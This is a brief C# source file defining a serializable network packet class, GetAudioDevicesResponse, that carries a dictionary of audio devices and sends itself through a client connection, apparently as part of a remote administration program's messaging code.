using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ClientPackets {

    [Serializable]
    public class GetAudioDevicesResponse : IPacket {

        public Dictionary<string, int> AudioDevices { get; set; }

        public GetAudioDevicesResponse() {

        }

        public GetAudioDevicesResponse(Dictionary<string, int> audioDevices) {
            this.AudioDevices = audioDevices;
        }

        public void Execute(Client client) {
            client.Send(this);
        }
    }
}
